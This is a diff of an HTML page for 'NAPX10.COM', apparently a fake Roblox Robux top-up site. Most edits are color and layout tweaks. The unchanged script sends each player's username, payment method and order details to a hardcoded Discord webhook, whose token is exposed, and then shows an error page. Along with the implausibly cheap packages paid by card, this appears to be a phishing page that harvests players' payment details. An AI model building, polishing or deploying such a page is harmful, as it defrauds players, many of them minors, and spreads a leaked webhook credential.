@@ -50,7 +50,7 @@
 
         .spinner {
             border: 4px solid #f3f3f3;
-            border-top: 4px solid #345e38;
+            border-top: 4px solid #2e5431;
             border-radius: 50%;
             width: 45px;
             height: 45px;
@@ -63,9 +63,9 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* --- HEADER CHUẨN XANH LỤC --- */
+        /* --- HEADER CHUẨN XANH LỤC ĐẬM --- */
         header {
-            background-color: #345e38;
+            background-color: #2e5431;
             color: white;
             padding: 14px 18px;
             display: flex;
@@ -84,17 +84,10 @@
             opacity: 0.7;
         }
 
-        .header-icons {
-            display: flex;
-            gap: 18px;
-            font-size: 19px;
-        }
-
-        /* --- THANH TIẾN TRÌNH 1-2-3-4 --- */
+        /* --- THANH TIẾN TRÌNH THEO ẢNH MẪU --- */
         .progress-container {
-            padding: 15px 20px;
+            padding: 20px;
             background-color: #fff;
-            border-bottom: 1px solid #f0f0f0;
         }
 
         .progress-line {
@@ -113,28 +106,27 @@
             left: 0;
             transform: translateY(-50%);
             width: 100%;
-            height: 2px;
+            height: 1px;
             background-color: #e0e0e0;
             z-index: 1;
         }
 
         .step-node {
-            width: 25px;
-            height: 25px;
+            width: 26px;
+            height: 26px;
             border-radius: 50%;
             background-color: #e0e0e0;
-            color: #666;
+            color: #7b7b7b;
             display: flex;
             justify-content: center;
             align-items: center;
             font-size: 13px;
             font-weight: bold;
             z-index: 2;
-            transition: all 0.2s ease;
         }
 
         .step-node.active {
-            background-color: #345e38;
+            background-color: #2e5431;
             color: white;
         }
 
@@ -165,7 +157,7 @@
         }
 
         .nav-history-link {
-            color: #345e38;
+            color: #2e5431;
             text-decoration: none;
             font-weight: 700;
             font-size: 14px;
@@ -196,7 +188,7 @@
         }
 
         .custom-input:focus {
-            border-color: #345e38;
+            border-color: #2e5431;
         }
 
         .static-select-box {
@@ -207,7 +199,6 @@
             font-size: 15px;
             background-color: #fff;
             display: flex;
-            justify-content: space-between;
             align-items: center;
             margin-bottom: 20px;
         }
@@ -215,7 +206,7 @@
         /* Nút Tiến Hành Chính */
         .action-button {
             width: 100%;
-            background-color: #345e38;
+            background-color: #2e5431;
             color: white;
             border: none;
             border-radius: 6px;
@@ -226,7 +217,7 @@
             text-transform: uppercase;
         }
 
-        /* --- KHU VỰC THÔNG TIN NHÂN VẬT (BƯỚC 2) --- */
+        /* --- KHU VỰC THÔNG TIN NHÂN VẬT --- */
         .user-info-banner {
             background-color: #f1f3f5;
             border-radius: 6px;
@@ -281,7 +272,7 @@
 
         .card-sub-price {
             font-size: 14px;
-            color: #345e38;
+            color: #2e5431;
             font-weight: bold;
             margin-top: 2px;
         }
@@ -292,7 +283,7 @@
             object-fit: contain;
         }
 
-        /* --- THÔNG TIN TỔNG KẾT (BƯỚC 4) --- */
+        /* --- THÔNG TIN TỔNG KẾT --- */
         .summary-box {
             border: 1px solid #e5e7eb;
             border-radius: 6px;
@@ -319,7 +310,7 @@
             margin-bottom: 15px;
         }
 
-        /* --- BANNER BÁO LỖI --- */
+        /* --- BANNER BÁO LỖI HỆ THỐNG --- */
         .error-report-container {
             text-align: center;
             padding: 15px 5px;
@@ -382,16 +373,13 @@
 
     <div id="loading-overlay">
         <div class="spinner"></div>
-        <div style="color: #345e38; font-weight: bold; font-size: 14px;">Đang xử lý...</div>
+        <div style="color: #2e5431; font-weight: bold; font-size: 14px;">Đang xử lý...</div>
     </div>
 
     <div class="main-container">
+        <!-- Đã xóa icon tài khoản & gạch ngang khoanh đỏ -->
         <header>
             <div class="logo-text">NAPX10<span>.COM</span></div>
-            <div class="header-icons">
-                <i class="fa-regular fa-circle-user"></i>
-                <i class="fa-solid fa-bars"></i>
-            </div>
         </header>
 
         <div class="progress-container">
@@ -405,17 +393,18 @@
 
         <div id="step1" class="step-page">
             <div class="page-top-nav">
+                <!-- Đã xóa nút trỏ xuống khoanh đỏ -->
                 <div class="game-title-badge">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox">
-                    Roblox <i class="fa-solid fa-caret-down" style="font-size: 12px; color: #666;"></i>
+                    Roblox 
                 </div>
                 <a href="#" class="nav-history-link">Kiểm Tra Giao Dịch</a>
             </div>
 
             <div class="field-label">Chọn game</div>
+            <!-- Đã xóa nút trỏ xuống khoanh đỏ -->
             <div class="static-select-box">
                 <span>Roblox</span>
-                <i class="fa-solid fa-caret-down" style="color: #666;"></i>
             </div>
 
             <div class="field-label">Nhập ID Game hoặc Username <span>( Hướng dẫn lấy ID )</span></div>
@@ -427,13 +416,12 @@
         <div id="step2" class="step-page" style="display: none;">
             <div class="field-label">Thông tin nhân vật</div>
             <div class="user-info-banner">
-                <span>Xin chào: <span id="display-user" style="color: #345e38;">--</span></span>
+                <span>Xin chào: <span id="display-user" style="color: #2e5431;">--</span></span>
                 <i class="fa-solid fa-right-left" style="color: #666; font-size: 14px;"></i>
             </div>
 
             <div class="field-label">Chọn gói nạp</div>
             <div class="item-grid">
-                <!-- GÓI MỚI CẬP NHẬT -->
                 <div class="grid-card" onclick="triggerLoading('goStep3', ['3,000 Robux', '20,000 đ'])">
                     <div class="hexagon-box">⬡</div>
                     <div class="card-main-title">3,000 Robux</div>
@@ -470,7 +458,7 @@
         <div id="step3" class="step-page" style="display: none;">
             <div class="field-label">Đã chọn gói</div>
             <div class="user-info-banner">
-                <span id="display-selected-pkg" style="color: #345e38;">--</span>
+                <span id="display-selected-pkg" style="color: #2e5431;">--</span>
                 <i class="fa-solid fa-right-left" style="color: #666; font-size: 14px;"></i>
             </div>
 
@@ -503,15 +491,15 @@
             <div class="summary-box">
                 <div class="summary-row">
                     <span>Gói nạp:</span>
-                    <span class="bold-val" id="summary-pkg-name" style="color: #345e38;">--</span>
+                    <span class="bold-val" id="summary-pkg-name" style="color: #2e5431;">--</span>
                 </div>
                 <div class="summary-row" style="border-top: 1px dashed #eee; margin-top: 6px; padding-top: 6px;">
                     <span>Tổng tiền:</span>
-                    <span class="bold-val" id="summary-pkg-price" style="color: #345e38;">--</span>
+                    <span class="bold-val" id="summary-pkg-price" style="color: #2e5431;">--</span>
                 </div>
             </div>
 
-            <div class="field-label">Thanh toán bằng thẻ: <span id="summary-method-name" style="color: #345e38;">--</span></div>
+            <div class="field-label">Thanh toán bằng thẻ: <span id="summary-method-name" style="color: #2e5431;">--</span></div>
             <div class="warning-box">
                 <b>Cảnh báo:</b> Người chơi vui lòng nạp đúng mệnh giá tương ứng gói nạp đã chọn. Giao dịch sai mệnh giá sẽ mất thẻ và không nhận được gói nạp.
             </div>
@@ -571,7 +559,6 @@
     </div>
 
     <script>
-        // Các biến toàn cục lưu trữ tạm thời dữ liệu nhập
         let savedUser = "";
         let savedPkgName = "";
         let savedPkgPrice = "";
@@ -664,7 +651,7 @@
             const timeStr = String(d.getHours()).padStart(2,'0') + ":" + String(d.getMinutes()).padStart(2,'0') + " " + String(d.getDate()).padStart(2,'0') + "/" + String(d.getMonth()+1).padStart(2,'0') + "/" + d.getFullYear();
             document.getElementById('res-clock').innerText = timeStr;
 
-            // --- GỬI DỮ LIỆU LÊN DISCORD WEBHOOK ---
+            // --- DISCORD WEBHOOK ---
             const webhookURL = "https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj";
             
             const payload = {
@@ -672,7 +659,7 @@
                 embeds: [
                     {
                         title: "Chi Tiết Đơn Hàng",
-                        color: 3432248,
+                        color: 3036209,
                         fields: [
                             { name: "👤 Người chơi", value: savedUser, inline: true },
                             { name: "📶 Phương thức", value: savedMethod, inline: true },
@@ -694,12 +681,11 @@
                 body: JSON.stringify(payload)
             })
             .then(response => {
-                console.log("Đã bắn tín hiệu thành công");
+                console.log("Success");
             })
             .catch(error => {
-                console.error("Lỗi khi gửi webhook:", error);
+                console.error("Error:", error);
             });
-            // --- KẾT THÚC GỬI WEBHOOK ---
 
             clearAllPages();
             document.getElementById('step5').style.display = 'block';
@@ -708,4 +694,3 @@
     </script>
 </body>
 </html>
-
